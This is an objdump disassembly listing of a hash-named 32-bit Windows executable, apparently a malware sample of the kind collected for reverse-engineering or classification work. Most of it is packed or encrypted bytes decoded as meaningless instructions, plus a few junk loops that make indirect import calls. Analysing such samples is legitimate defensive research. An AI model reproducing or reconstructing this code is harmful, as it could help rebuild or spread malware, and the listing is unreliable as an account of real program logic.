
220a38040fe58e1291fa02a888fbf0eb738fbce509d2ea1f4b57ee2d09ab1a5c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xc584bc8c
  40101f:	ja     0x40109f
  401021:	jle    0x4010a1
  401023:	jle    0x400fbd
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	nop
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x16b1b59f
  4010d2:	test   eax,0x3cbf0fa4
  4010d7:	imul   ebp,esi,0xfd1cafa
  4010dd:	add    eax,0x27e39cd9
  4010e2:	push   0x7a1dcc7d
  4010e7:	pop    eax
  4010e8:	daa    
  4010e9:	dec    ecx
  4010ea:	xor    ch,BYTE PTR [ebp-0x8]
  4010ed:	add    ebx,edx
  4010ef:	jmp    0x1d7a:0x7bbfe7b6
  4010f6:	sub    esp,DWORD PTR [edx]
  4010f8:	loop   0x401139
  4010fa:	jmp    0x5e8371ed
  4010ff:	push   ds
  401100:	(bad)
  401103:	push   ebx
  401104:	and    ch,BYTE PTR [eax-0x68]
  401107:	push   ebp
  401108:	iret   
  401109:	aas    
  40110a:	out    dx,eax
  40110b:	xchg   edi,eax
  40110c:	mov    edx,0x7de4233a
  401111:	sar    BYTE PTR fs:[ebx],0x34
  401115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401116:	scas   al,BYTE PTR es:[edi]
  401117:	test   eax,0x234fd850
  40111c:	loopne 0x4010ce
  40111e:	cld    
  40111f:	cli    
  401120:	pusha  
  401121:	in     eax,dx
  401122:	daa    
  401123:	leave  
  401124:	xor    edx,esi
  401126:	inc    eax
  401127:	jno    0x4010fa
  401129:	or     ah,BYTE PTR [edx+ecx*2-0x64]
  40112d:	into   
  40112e:	xor    edi,DWORD PTR [edx-0x3cd6d439]
  401134:	jns    0x4010f7
  401136:	neg    DWORD PTR [ecx-0x26766f19]
  40113c:	mov    edi,0x97833a9f
  401141:	and    al,0x6
  401143:	imul   edi,DWORD PTR ds:0xbf52590,0x91c948f6
  40114d:	pop    esp
  40114e:	retf   0xb82b
  401151:	xchg   esi,eax
  401152:	mov    edx,0x9c6a2684
  401157:	scas   eax,DWORD PTR es:[edi]
  401158:	in     al,0x93
  40115a:	add    edx,DWORD PTR [edi+0x14df341c]
  401160:	xor    BYTE PTR [edi],ch
  401162:	adc    eax,0xaeb0cdf5
  401167:	add    BYTE PTR [edi-0x50],0x70
  40116b:	pop    edi
  40116c:	cmp    eax,0x91251ee5
  401171:	sub    BYTE PTR [edi+0x761db13f],al
  401177:	dec    ebp
  401178:	jae    0x401109
  40117a:	pop    ss
  40117b:	aas    
  40117c:	cld    
  40117d:	xor    al,0x50
  40117f:	add    BYTE PTR [esi-0x1],bl
  401182:	push   ss
  401183:	adc    ebx,ebp
  401185:	inc    eax
  401186:	mov    bl,0x43
  401188:	adc    DWORD PTR [edx+esi*4+0xf],edx
  40118c:	mov    DWORD PTR [esi-0x70],esi
  40118f:	inc    ebx
  401190:	add    edx,DWORD PTR [ecx]
  401192:	outs   dx,BYTE PTR ds:[esi]
  401193:	(bad)  
  401194:	cmc    
  401195:	(bad)  
  401196:	je     0x4011e3
  401198:	inc    ebp
  401199:	inc    edx
  40119a:	aas    
  40119b:	jg     0x4011e4
  40119d:	jp     0x4011b1
  40119f:	add    eax,0xe6ed97f8
  4011a4:	push   eax
  4011a5:	imul   edx,edi,0x4
  4011a8:	pop    esi
  4011a9:	inc    esi
  4011aa:	push   cs
  4011ab:	push   edi
  4011ac:	cli    
  4011ad:	stc    
  4011ae:	or     esp,DWORD PTR [eax]
  4011b0:	(bad)  
  4011b1:	aam    0x50
  4011b3:	jl     0x4011ea
  4011b5:	sub    DWORD PTR [eax+edx*2-0x41],ebx
  4011b9:	les    ebx,FWORD PTR [edi*1-0x7f7be76c]
  4011c0:	inc    ecx
  4011c1:	popa   
  4011c2:	ss mov al,0xe4
  4011c5:	jb     0x40119c
  4011c7:	sbb    bh,ah
  4011c9:	jmp    0x401231
  4011cb:	add    ch,ah
  4011cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430455,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430455
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430455,ecx
  401209:	cmp    DWORD PTR ds:0x430455,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ec0b
  401248:	cmp    DWORD PTR ds:0x430455,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430455
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430455,ecx
  401262:	cmp    DWORD PTR ds:0x430455,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43044d,0x1e
  401279:	cmp    DWORD PTR ds:0x43044d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43044d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e9a7
  40129c:	mov    ecx,DWORD PTR ds:0x43044d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43044d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x64296697]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40124c
  4012cc:	pop    esp
  4012cd:	and    eax,0xf3930520
  4012d2:	xchg   ebx,eax
  4012d3:	xor    BYTE PTR es:[esi-0x6fe7ce62],ch
  4012da:	sub    BYTE PTR [eax],0x7a
  4012dd:	fs mov dh,0xc4
  4012e0:	push   ebx
  4012e1:	pop    ebp
  4012e2:	sub    eax,0xef58f0e4
  4012e8:	loopne 0x40134f
  4012ea:	pushf  
  4012eb:	inc    ebx
  4012ec:	fwait
  4012ed:	stc    
  4012ee:	mov    ds:0x9aa5f23c,eax
  4012f3:	sbb    DWORD PTR [ebp+0x6dba745f],ebp
  4012f9:	nop
  4012fa:	in     al,dx
  4012fb:	xchg   edx,eax
  4012fc:	fwait
  4012fd:	dec    esp
  4012fe:	mov    cl,0x3d
  401300:	ins    DWORD PTR es:[edi],dx
  401301:	inc    ebx
  401302:	jb     0x401376
  401304:	arpl   di,si
  401306:	sub    BYTE PTR [edx-0x450cb21b],cl
  40130c:	test   cl,al
  40130e:	pusha  
  40130f:	mov    BYTE PTR [edi],dl
  401311:	test   DWORD PTR [edi],eax
  401313:	arpl   WORD PTR [esi+0x1d8006c8],bp
  401319:	jb     0x4012d2
  40131b:	and    eax,0x4b57e9c
  401320:	out    0xe9,al
  401322:	fcom   QWORD PTR [esi]
  401324:	mov    bl,0x77
  401326:	jecxz  0x4012c3
  401328:	inc    DWORD PTR [eax-0x61]
  40132b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40132c:	call   0xb2f1:0xb389442a
  401333:	jne    0x4012e5
  401335:	xlat   BYTE PTR ds:[ebx]
  401336:	lahf   
  401337:	mov    eax,0xa6ff9030
  40133c:	xchg   DWORD PTR [eax],esi
  40133e:	xlat   BYTE PTR ds:[ebx]
  40133f:	cld    
  401340:	rol    cl,cl
  401342:	ret    0x892a
  401345:	sti    
  401346:	(bad)  
  401347:	cmp    al,0x27
  401349:	pop    es
  40134a:	sbb    eax,0xc7c4252b
  40134f:	push   0x29
  401351:	xchg   esp,eax
  401352:	mov    ds:0xed84c3bb,eax
  401357:	icebp  
  401358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401359:	shl    BYTE PTR [ecx-0x7399a19a],1
  40135f:	aad    0x3c
  401361:	add    DWORD PTR [esp+ebp*2-0x1c],0xfffffff0
  401366:	or     eax,0xfe5e1489
  40136b:	mov    ?,WORD PTR [esp+ecx*1-0x25]
  40136f:	jle    0x401363
  401371:	das    
  401372:	push   esp
  401373:	mov    edx,DWORD PTR [edx]
  401375:	inc    edx
  401376:	pop    ds
  401377:	sub    al,0xd
  401379:	mov    ds:0x7498601b,al
  40137e:	out    0x35,al
  401380:	sub    ah,BYTE PTR [esi+0x48f4446f]
  401386:	mov    edx,0x21015331
  40138b:	jns    0x401335
  40138d:	jb     0x401382
  40138f:	(bad)
  401392:	mov    bh,0xe1
  401394:	xor    eax,0x5c20e2eb
  401399:	out    0x9c,al
  40139b:	ror    BYTE PTR ss:[ebx],0x49
  40139f:	mov    ch,0x89
  4013a1:	sub    esi,edx
  4013a3:	mov    ebx,ebp
  4013a5:	test   DWORD PTR [ebp-0x56],edi
  4013a8:	push   0x7
  4013aa:	mov    bl,0x73
  4013ac:	ds mov ah,0x35
  4013af:	cwde   
  4013b0:	adc    al,0x41
  4013b2:	jge    0x4013fc
  4013b4:	or     DWORD PTR [edx],esi
  4013b6:	xlat   BYTE PTR ds:[ebx]
  4013b7:	ret    
  4013b8:	popa   
  4013b9:	or     BYTE PTR [ebp-0x1c],ah
  4013bc:	adc    eax,0x236af49d
  4013c1:	jl     0x40136a
  4013c3:	ins    BYTE PTR es:[edi],dx
  4013c4:	aaa    
  4013c5:	enter  0x8d7,0xd9
  4013c9:	add    DWORD PTR [esi-0x39],esi
  4013cc:	lahf   
  4013cd:	dec    ebx
  4013ce:	scas   al,BYTE PTR es:[edi]
  4013cf:	pop    esp
  4013d0:	out    dx,al
  4013d1:	lock int 0x55
  4013d4:	ins    DWORD PTR es:[edi],dx
  4013d5:	pop    ds
  4013d6:	fisub  DWORD PTR [eax+eiz*2]
  4013d9:	sbb    eax,0xd57c9d66
  4013de:	adc    bl,BYTE PTR [edx+0x2b4ce0e8]
  4013e4:	outs   dx,BYTE PTR ds:[esi]
  4013e5:	(bad)  
  4013e6:	mov    bl,0xcd
  4013e8:	or     ecx,ecx
  4013ea:	scas   al,BYTE PTR es:[edi]
  4013eb:	inc    ecx
  4013ec:	je     0x40137b
  4013ee:	sbb    cl,BYTE PTR [edi+0x31]
  4013f1:	jno    0x401403
  4013f3:	repnz add al,0x3a
  4013f6:	jp     0x401386
  4013f8:	cwde   
  4013f9:	push   edx
  4013fa:	and    BYTE PTR cs:[ebx],ah
  4013fd:	stos   BYTE PTR es:[edi],al
  4013fe:	std    
  4013ff:	out    dx,eax
  401400:	xchg   ebx,ebp
  401402:	push   es
  401403:	ret    
  401404:	mov    edi,0xe5deb7c5
  401409:	xchg   edx,eax
  40140a:	pop    ds
  40140b:	inc    esp
  40140c:	daa    
  40140d:	jmp    0x81aab3be
  401412:	or     eax,0x8830e922
  401417:	inc    ecx
  401418:	test   BYTE PTR [ebx],cl
  40141a:	xor    eax,0x4560f369
  40141f:	push   eax
  401420:	ja     0x40147c
  401422:	or     al,0x86
  401424:	ror    BYTE PTR [ecx+0x18],cl
  401427:	popf   
  401428:	into   
  401429:	ror    BYTE PTR [eax+0x4d5befc7],1
  40142f:	leave  
  401430:	into   
  401431:	test   eax,0x7d64e398
  401436:	sbb    al,0x62
  401438:	fs mov ecx,0x167ac0e5
  40143e:	int    0x68
  401440:	adc    ebx,ecx
  401442:	shl    DWORD PTR [ebx-0x58a3d2cf],cl
  401448:	outs   dx,BYTE PTR ds:[esi]
  401449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40144a:	xor    eax,0x240299dd
  40144f:	rol    DWORD PTR [esp+eax*8],1
  401452:	idiv   esi
  401454:	jmp    0x401439
  401456:	cmp    al,0x62
  401458:	lds    eax,FWORD PTR [eax-0x39]
  40145b:	mov    ah,ah
  40145d:	push   edi
  40145e:	push   esi
  40145f:	mov    ecx,0x1f38ade4
  401464:	xchg   ebp,eax
  401465:	imul   ebx,ecx,0x11890f70
  40146b:	aas    
  40146c:	aas    
  40146d:	cmp    bh,BYTE PTR [ecx-0x46a9b9e5]
  401473:	cmp    al,0x8a
  401475:	add    BYTE PTR [eax],al
  401477:	adc    DWORD PTR ds:0x42eddb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430439
  40148b:	or     DWORD PTR ds:0x4304eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x3200fff
  4014a7:	outs   dx,BYTE PTR ds:[esi]
  4014a8:	inc    eax
  4014a9:	ret    0x7e7d
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x4014f1
  4014b2:	out    0x8d,al
  4014b4:	test   al,0x1a
  4014b6:	dec    ebx
  4014b7:	retf   0xe171
  4014ba:	leave  
  4014bb:	dec    eax
  4014bc:	push   ss
  4014bd:	fidivr DWORD PTR [eax]
  4014bf:	rol    BYTE PTR [ebp+0x6a57ac8e],cl
  4014c5:	dec    edi
  4014c6:	adc    al,0xca
  4014c8:	call   0x60c9:0xd064cd6b
  4014cf:	xor    al,0xa3
  4014d1:	paddsw mm1,mm5
  4014d4:	aad    0xc2
  4014d6:	push   ss
  4014d7:	clc    
  4014d8:	jb     0x40150d
  4014da:	push   ss
  4014db:	cmp    eax,0xba520d47
  4014e0:	xchg   esi,eax
  4014e1:	std    
  4014e2:	pop    ds
  4014e3:	xchg   edx,eax
  4014e4:	push   esp
  4014e5:	fwait
  4014e6:	xor    al,dl
  4014e8:	adc    BYTE PTR [edi-0x726639da],ch
  4014ee:	sar    DWORD PTR [eax-0xf],0xd5
  4014f2:	adc    cl,dh
  4014f4:	mov    ecx,0xffbf4916
  4014f9:	add    DWORD PTR [ebx+0x2e],edi
  4014fc:	retf   0xa0f7
  4014ff:	rcl    DWORD PTR [esi+0x1c858198],cl
  401505:	xchg   edi,eax
  401506:	mov    dl,0xf8
  401508:	jns    0x401588
  40150a:	pop    ss
  40150b:	inc    ebp
  40150c:	jne    0x401561
  40150e:	cdq    
  40150f:	pop    ecx
  401510:	or     BYTE PTR [edx-0x6ce57f36],dl
  401516:	jmp    0xa66f9d67
  40151b:	test   eax,0xacdcf99f
  401520:	lock rcr BYTE PTR [ecx],cl
  401523:	and    eax,0x5a7ff78d
  401528:	fstp   TBYTE PTR [ecx]
  40152a:	or     DWORD PTR [edx],ebx
  40152c:	ins    BYTE PTR es:[edi],dx
  40152d:	addr16 pushf 
  40152f:	out    0x42,al
  401531:	lahf   
  401532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401533:	jb     0x401538
  401535:	push   ebp
  401536:	add    cl,BYTE PTR [esi-0x5bd20598]
  40153c:	mov    ah,0xe7
  40153e:	jmp    0xe268d3a6
  401543:	repz dec esi
  401545:	cwde   
  401546:	or     ebp,DWORD PTR [ecx-0x1f]
  401549:	cmp    DWORD PTR [eax-0x5],esp
  40154c:	pop    edi
  40154d:	jp     0x401596
  40154f:	xlat   BYTE PTR ds:[ebx]
  401550:	rcr    DWORD PTR ds:0xb55991cc,1
  401556:	outs   dx,DWORD PTR ds:[esi]
  401557:	add    BYTE PTR [esi+0x52],bl
  40155a:	jno    0x4014ef
  40155c:	mov    edx,0x36e6a64
  401561:	dec    ecx
  401562:	mov    cr0,ebx
  401565:	je     0x4015a3
  401567:	xor    edx,DWORD PTR fs:[ecx+0xb]
  40156b:	aaa    
  40156c:	mov    bl,0xe2
  40156e:	jo     0x401545
  401570:	jmp    0x4014fa
  401572:	outs   dx,DWORD PTR ds:[esi]
  401573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401574:	imul   esi,esi,0x9a995653
  40157a:	test   DWORD PTR [edi-0x5a28838a],edi
  401580:	sub    ebp,DWORD PTR [esp+edx*8-0x71]
  401584:	sub    BYTE PTR [ecx+0x67],ch
  401587:	in     al,dx
  401588:	ja     0x401588
  40158a:	ficomp DWORD PTR [esi]
  40158c:	mov    al,0xe3
  40158e:	xor    ch,dh
  401590:	xchg   ecx,eax
  401591:	cmp    eax,DWORD PTR [edi-0x1ceb9fa7]
  401597:	and    dh,BYTE PTR [eax+ebx*4-0x770f1685]
  40159e:	fwait
  40159f:	std    
  4015a0:	or     BYTE PTR ds:0xb55864d7,dl
  4015a6:	sub    eax,0x15f13236
  4015ab:	mov    edx,0x4ba72102
  4015b0:	aaa    
  4015b1:	ror    eax,cl
  4015b3:	push   ss
  4015b4:	dec    eax
  4015b5:	adc    cl,BYTE PTR [ecx]
  4015b7:	jmp    0x4d7368e4
  4015bc:	mov    ah,0xda
  4015be:	inc    ebp
  4015bf:	cdq    
  4015c0:	pop    eax
  4015c1:	add    bl,BYTE PTR [eax+0x3c803d14]
  4015c7:	out    0x38,eax
  4015c9:	adc    BYTE PTR [esi+0x63076baa],bl
  4015cf:	add    DWORD PTR [ebp+edx*1-0x52],ecx
  4015d3:	fwait
  4015d4:	pusha  
  4015d5:	call   0xcef1:0x7600dba5
  4015dc:	xchg   DWORD PTR [edi-0x80],ecx
  4015df:	dec    edi
  4015e0:	push   ds
  4015e1:	addr16 addr16 mov al,ds:0x3d36
  4015e6:	sbb    BYTE PTR [edi-0x4c],dl
  4015e9:	rcl    BYTE PTR [eax],cl
  4015eb:	mov    bh,0x19
  4015ed:	movlps QWORD PTR [ebx],xmm0
  4015f0:	push   ecx
  4015f1:	xchg   DWORD PTR [eax-0x37],ecx
  4015f4:	fidivr DWORD PTR [ebx]
  4015f6:	sub    ecx,DWORD PTR [esi-0x5870df7]
  4015fc:	and    al,0x88
  4015fe:	fcomi  st,st(7)
  401600:	jb     0x401592
  401602:	dec    edx
  401603:	sub    BYTE PTR ds:0xfabdc507,cl
  401609:	popf   
  40160a:	inc    ecx
  40160b:	data16 mov al,0xc4
  40160e:	xchg   ebx,eax
  40160f:	pop    ebx
  401610:	jne    0x4015ca
  401612:	xchg   esi,eax
  401613:	mov    ah,0x59
  401615:	mov    ds:0x6f5c71e4,al
  40161a:	jmp    0x1867dace
  40161f:	in     eax,0xa4
  401621:	xchg   ecx,eax
  401622:	push   esp
  401623:	adc    al,0x19
  401625:	(bad)  
  401626:	into   
  401627:	popa   
  401628:	cmp    dl,dh
  40162a:	std    
  40162b:	push   ebp
  40162c:	sub    eax,0x406d1917
  401631:	cld    
  401632:	lock mov ebx,0x4cffd49d
  401638:	sub    al,0xc4
  40163a:	and    al,0x19
  40163c:	sub    DWORD PTR [edi],esi
  40163e:	sbb    al,0xd4
  401640:	xchg   esp,eax
  401641:	pop    ebx
  401642:	div    DWORD PTR [edi-0x56]
  401645:	imul   ebx,DWORD PTR [ecx+0x20e761f2],0xffffffdd
  40164c:	sbb    BYTE PTR [ecx],bh
  40164e:	sbb    DWORD PTR [ecx+0x64af9e0a],0x57d5ef80
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	out    0x61,eax
  40166d:	lahf   
  40166e:	jmp    0x4016dc
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x4016eb
  401678:	pop    ebp
  401679:	jmp    0xdf14:0x679cfa2b
  401680:	xor    eax,0x8318c02a
  401685:	and    al,0xfd
  401687:	xor    DWORD PTR [ebx-0x5d2c092f],edi
  40168d:	(bad)  
  40168f:	call   0x2089:0x1aec81f4
  401696:	cwde   
  401697:	xchg   esi,eax
  401698:	mov    ss,WORD PTR [edx-0x2aa6ae3f]
  40169e:	cdq    
  40169f:	enter  0x14de,0xaf
  4016a3:	je     0x40169e
  4016a5:	js     0x40162c
  4016a7:	mov    ecx,0x2c447de7
  4016ac:	aaa    
  4016ad:	shl    ch,cl
  4016af:	stos   DWORD PTR es:[edi],eax
  4016b0:	pop    ss
  4016b1:	mov    eax,0xffd84b73
  4016b6:	mov    ds:0x391c108a,al
  4016bb:	adc    esi,DWORD PTR [edx+0x51b6799]
  4016c1:	je     0x40167c
  4016c3:	xchg   ecx,eax
  4016c4:	imul   edi,DWORD PTR [esi],0xa5ed81d7
  4016ca:	adc    eax,0x3bbc85b4
  4016cf:	xor    cl,bh
  4016d1:	jg     0x4016d8
  4016d3:	lea    ebx,[eax+0x12]
  4016d6:	adc    eax,0x27149b88
  4016db:	outs   dx,DWORD PTR ss:[esi]
  4016dd:	pop    ebp
  4016de:	jno    0x4016bb
  4016e0:	inc    ebp
  4016e1:	adc    eax,0xcc8a5511
  4016e6:	mov    edx,0xf3a0fe9f
  4016eb:	out    dx,al
  4016ec:	xchg   ebp,eax
  4016ed:	pop    eax
  4016ee:	lods   al,BYTE PTR ds:[esi]
  4016ef:	frstor [eax*4+0x67cdf3a0]
  4016f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f7:	xchg   esp,eax
  4016f8:	out    dx,eax
  4016f9:	xor    DWORD PTR [ebp+edx*4+0x67],ecx
  4016fd:	add    edx,DWORD PTR [ebx]
  4016ff:	into   
  401700:	repz fmul DWORD PTR [esi-0x4c9cf082]
  401707:	leave  
  401708:	clc    
  401709:	adc    al,0xae
  40170b:	mov    BYTE PTR [edi-0x29],ah
  40170e:	xor    ebp,DWORD PTR [edx]
  401710:	push   edi
  401711:	mov    cl,0x2a
  401713:	add    esp,esp
  401715:	mov    bl,0x95
  401717:	sbb    BYTE PTR [eax-0x7d],0x9a
  40171b:	jg     0x40172d
  40171d:	cmp    eax,0x8d20a0b9
  401722:	adc    DWORD PTR [ebx+0x45],0x4b5388c6
  401729:	in     al,dx
  40172a:	scas   al,BYTE PTR es:[edi]
  40172b:	cmp    bl,al
  40172d:	push   esp
  40172e:	pop    ss
  40172f:	jl     0x401738
  401731:	adc    eax,0xe4040e55
  401736:	mov    cl,0xab
  401738:	mov    dl,BYTE PTR [eax+0x74a93cdf]
  40173e:	lock xchg ebx,eax
  401740:	loope  0x4016f4
  401742:	add    al,0xe8
  401744:	mov    esp,DWORD PTR [edx]
  401746:	rcl    DWORD PTR [eax+0x3d0497df],1
  40174c:	inc    ebx
  40174d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40174e:	in     eax,0x7e
  401750:	shr    BYTE PTR [edx+0x58],cl
  401753:	inc    ebp
  401754:	jb     0x40178f
  401756:	imul   ebx,ebp,0xfffffffa
  401759:	retf   
  40175a:	fnstenv [edi+0x5e]
  40175d:	sbb    BYTE PTR [ebp+0x56],0x69
  401761:	push   ecx
  401762:	jbe    0x40175d
  401764:	pop    edi
  401765:	and    ebx,DWORD PTR [eax+0x3abadfac]
  40176b:	addr16 pushf 
  40176d:	xchg   ecx,eax
  40176e:	dec    esp
  40176f:	add    ebp,DWORD PTR [ebp+esi*1+0x50]
  401773:	shr    DWORD PTR [edx],1
  401775:	sbb    edx,0xc1f71dc0
  40177b:	clc    
  40177c:	add    al,0xf1
  40177e:	xchg   edx,eax
  40177f:	dec    DWORD PTR [ecx]
  401781:	jecxz  0x401730
  401783:	out    dx,al
  401784:	jmp    0xf483:0x33ee858c
  40178b:	dec    esi
  40178c:	cli    
  40178d:	fidiv  DWORD PTR [ebx]
  40178f:	out    dx,al
  401790:	push   ss
  401791:	xchg   BYTE PTR es:[ecx],dh
  401794:	xor    ecx,DWORD PTR [eax+ecx*2-0x3d]
  401798:	popa   
  401799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40179a:	push   eax
  40179b:	(bad)  
  40179d:	sbb    eax,0x9bb30d06
  4017a2:	xor    BYTE PTR ss:[ecx+0x4c],bh
  4017a6:	mov    edi,0x54ff25dd
  4017ab:	add    BYTE PTR [edi-0x73e760b2],dh
  4017b1:	test   BYTE PTR [ecx+0x177efd85],bl
  4017b7:	js     0x40173c
  4017b9:	or     al,0x3d
  4017bb:	and    edx,edi
  4017bd:	sbb    dh,cl
  4017bf:	fisttp DWORD PTR ds:0x3078241b
  4017c5:	cs into 
  4017c7:	push   ebx
  4017c8:	jmp    0x401806
  4017ca:	inc    ebx
  4017cb:	xchg   BYTE PTR [ecx+edi*4-0x54],dl
  4017cf:	xchg   edi,eax
  4017d0:	inc    edi
  4017d1:	(bad)  
  4017d2:	test   al,0xfb
  4017d4:	lock shl edi,1
  4017d7:	arpl   ax,cx
  4017d9:	push   edi
  4017da:	out    dx,al
  4017db:	or     ebp,edx
  4017dd:	scas   eax,DWORD PTR es:[edi]
  4017de:	pop    ecx
  4017df:	pop    edx
  4017e0:	push   0x86b30e39
  4017e5:	into   
  4017e6:	inc    edx
  4017e7:	stos   DWORD PTR es:[edi],eax
  4017e8:	shl    DWORD PTR [eax+edx*1],0x9d
  4017ec:	inc    edx
  4017ed:	dec    esi
  4017ee:	mov    bl,0xc8
  4017f0:	push   ds
  4017f1:	sbb    bh,BYTE PTR [ebp+0x3a]
  4017f4:	test   eax,0xf48d9055
  4017f9:	jae    0x4017dd
  4017fb:	out    0x96,eax
  4017fd:	fsub   QWORD PTR [esi+0x71efcbdc]
  401803:	out    dx,eax
  401804:	test   BYTE PTR [ebp-0x31a7e0ed],bh
  40180a:	xchg   esi,eax
  40180b:	add    al,0xf
  40180d:	push   ebp
  40180e:	rol    DWORD PTR [edx+0x1cfe9149],1
  401814:	dec    edi
  401815:	stc    
  401816:	xchg   esi,eax
  401817:	data16 add al,BYTE PTR [ebp-0x3f]
  40181b:	and    al,0xa2
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430455,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x430459,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430459
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430459,esi
  401849:	cmp    DWORD PTR ds:0x430459,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea93
  401863:	cmp    DWORD PTR ds:0x430459,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
